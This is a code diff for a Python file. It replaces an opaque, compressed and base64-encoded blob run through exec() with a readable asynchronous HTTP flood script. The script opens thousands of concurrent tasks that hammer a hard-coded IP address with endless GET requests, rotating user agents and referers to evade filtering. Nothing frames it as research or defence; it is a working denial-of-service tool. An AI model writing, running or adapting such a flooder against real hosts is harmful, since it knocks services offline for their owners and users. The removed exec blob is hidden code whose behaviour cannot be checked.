@@ -1,4 +1,25 @@
-import lzma, base64
-exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4APQAjldADSbSme4UjxzyHh8Wd0or3//TLv0hucxanCJwxBWHQU1cFCc1FOMB5gqipHrkTh/2bTF8OXifaNTDg9KZ1GBqeJESSL9LrMM9gWhk+iysHuykTmc5D4ur9uB9P7TZZ0ufOV+nXTVd3FGogz1DiCdraADAt3LNY5YiK4Y1jk9TGOIpPM+SPk400EAXQJOxkY2gSknA7vlFv9Qe25antkUCa+tF1NuyF4VcGqAEiR9tpHx3NGHhv03ymlLJ052M3znSV6KUz5jynNMaoIazWHhm9K38S6IkAEktei4hZeNHJKIcdqkXfXdPET6q7qCFg2HJedSaemyr9KjeyETrJw8guT5zrlobRc3Zo4gtyZS6N8NUTyL+86u6BCvVJ/UqRVwTxw/9LUYaxfX6ZZJQNBMfiK2MKnitQJVcxWnRc2X+tjXfiht2zezAeN1d/8CpyEpVbnWab/YF7rnBm9xBx45z2NUJWaaCcrdl65818cduewmBlpb5qcGPr9QgeeCvr0wDt+PNSDizCpe/lkEQg4duqIci0egmxxbIyosJaVljuR0C7JqjDx71tUCp5TLKjIR7xtcEqPtPUs6E1/iGiM8q8bbMStTJoH3eWPwuRSwk0uvs3fhnJHIcJnxMZOMuM+qx/APDAdClmEd3dppzBQGFvSbaa6TmhJ6MJq5eBavo9+R4gADYhQlOg3zL98gUbewSjOW6XjPVOsIO0AvTvW3+boUPFyGXtt+zG6XGDK3kMFsUb1lyTGYdSZ/AAAAAKYpkjEKNnb4AAHVBNEHAAD4N4HvscRn+wIAAAAABFla')))
-# Created by pyminifier (https://github.com/liftoff/pyminifier)
-
+import asyncio
+import os
+import random
+import aiohttp
+def initialize_resources():
+ with open("res/referers.txt")as referers:
+  with open("res/useragents.txt")as user_agents:
+   return referers.readlines(),user_agents.readlines()
+referers,user_agents=initialize_resources()
+async def run(url:str,task_id:int):
+ async with aiohttp.ClientSession()as session:
+  while True:
+   try:
+    await session.get(url,headers={"User-Agent":random.choice(user_agents).strip(),"Cache-Control":"no-cache","Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7","Referer":random.choice(referers).strip()+url,"Keep-Alive":str(random.randint(110,120)),"Connection":"keep-alive",},)
+   except Exception as e:
+    print(f"Exception in task {task_id}: {e.__class__.__name__}: {e}")
+def main():
+ tasks=3000 if "PORT" in os.environ else 1000
+ url="http://207.148.80.115:8123/"
+ loop=asyncio.get_event_loop()
+ for i in range(tasks):
+  loop.create_task(run(url,i))
+ loop.run_forever()
+if __name__=="__main__":
+ main()
